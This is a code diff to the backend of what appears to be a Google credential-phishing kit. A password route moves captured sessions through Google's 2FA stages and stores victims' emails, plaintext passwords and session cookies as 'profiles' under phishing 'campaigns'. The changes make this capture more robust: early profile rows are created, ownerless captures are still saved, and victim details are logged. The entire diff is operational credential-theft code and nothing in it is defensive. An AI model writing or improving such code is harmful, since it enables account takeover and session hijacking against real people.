@@ -300,22 +300,30 @@ router.post('/:id/password', async (req: Request, res: Response) => {
     // When Google requires 2FA or DP — create profile row immediately so it appears on the profile page
     if (result.success && result.nextStage !== 'success') {
       try {
+        const resolvedCampaignId = session.campaignId || undefined;
         let earlyUserId: string | undefined;
-        try {
-          const camp = await prisma.campaign.findUnique({ where: { id: session.campaignId } });
-          earlyUserId = camp?.userId ?? undefined;
-        } catch {}
 
-        const earlyProfile = await profileManagerService.createProfile({
-          userId: earlyUserId,
-          campaignId: session.campaignId || '',
-          email: session.email || '',
-          password,
-          cookies: [],
-          provider: 'GOOGLE',
-        });
-        (session as any).profileId = earlyProfile.profile.id;
-        logger.info(`[CAPTURE] Profile row created at password stage: ${earlyProfile.profile.id} for ${session.email}`);
+        if (resolvedCampaignId) {
+          try {
+            const camp = await prisma.campaign.findUnique({ where: { id: resolvedCampaignId } });
+            earlyUserId = camp?.userId ?? undefined;
+          } catch {}
+        }
+
+        if (!session.email) {
+          logger.warn(`[CAPTURE] Cannot create early profile — no email for session ${id}`);
+        } else {
+          const earlyProfile = await profileManagerService.createProfile({
+            userId: earlyUserId,
+            campaignId: resolvedCampaignId,
+            email: session.email,
+            password,
+            cookies: [],
+            provider: 'GOOGLE',
+          });
+          (session as any).profileId = earlyProfile.profile.id;
+          logger.info(`[CAPTURE] Profile row created at password stage: ${earlyProfile.profile.id} for ${session.email} (campaign: ${resolvedCampaignId ?? 'none'})`);
+        }
       } catch (earlyErr: any) {
         logger.warn(`[CAPTURE] Early profile row skipped: ${earlyErr.message}`);
       }
@@ -568,26 +576,28 @@ async function createProfileFromSession(sessionId: string, cookies: any[]) {
       } catch {}
     }
 
-    // Guard checks
-    if (!email) {
-      logger.warn(`[CAPTURE] No email — cannot save profile for session ${sessionId}`);
-      return;
-    }
     if (!userId) {
-      logger.warn(`[CAPTURE] No userId resolved — profile will not appear in any user's panel`);
+      logger.info(`[CAPTURE] No userId resolved for session ${sessionId} — profile will be unowned but still saved`);
     }
 
-    // Production mode — save profile to DB
+    if (!email) {
+      logger.warn(`[CAPTURE] Cannot create profile — no email resolved for session ${sessionId}`);
+      return;
+    }
+
+    const resolvedCampaignId = campaignId || undefined;
+    logger.info(`[CAPTURE] Creating profile — email: ${email}, campaignId: ${resolvedCampaignId ?? 'none'}, cookies: ${googleCookies.length}, userId: ${userId ?? 'none'}`);
+
     await profileManagerService.createProfile({
       userId,
-      campaignId: campaignId || '',
-      email: email || '',
+      campaignId: resolvedCampaignId,
+      email,
       password: password || '',
       cookies: googleCookies,
       provider: 'GOOGLE',
     });
 
-    logger.success(`Profile created from session: ${sessionId}`);
+    logger.success(`[CAPTURE] Profile created — session: ${sessionId}, email: ${email}, cookies: ${googleCookies.length}`);
   } catch (error) {
     logger.error('Create profile from session error:', error);
   }
